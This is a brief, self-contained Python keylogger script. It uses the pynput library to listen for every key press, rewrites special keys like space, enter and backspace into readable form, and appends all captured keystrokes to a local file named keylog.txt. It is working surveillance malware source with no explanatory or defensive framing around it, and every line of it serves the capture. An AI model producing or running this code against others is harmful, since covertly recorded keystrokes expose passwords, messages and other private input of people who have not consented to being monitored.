from pynput.keyboard import Listener

# File to store logs
log_file = "keylog.txt"

# Function to write keystrokes to a file
def log_key(key):
    key = str(key).replace("'", "")  # Clean formatting
    if key == "Key.space":
        key = " "  # Replace space key with an actual space
    elif key == "Key.enter":
        key = "\n"  # New line for Enter key
    elif key == "Key.backspace":
        key = "[BACKSPACE]"
    elif "Key" in key:
        key = f"[{key}]"  # Handle special keys like Shift, Ctrl, etc.
    
    with open(log_file, "a") as file:
        file.write(key)  # Append key to log file

# Listen for key events
with Listener(on_press=log_key) as listener:
    listener.join()
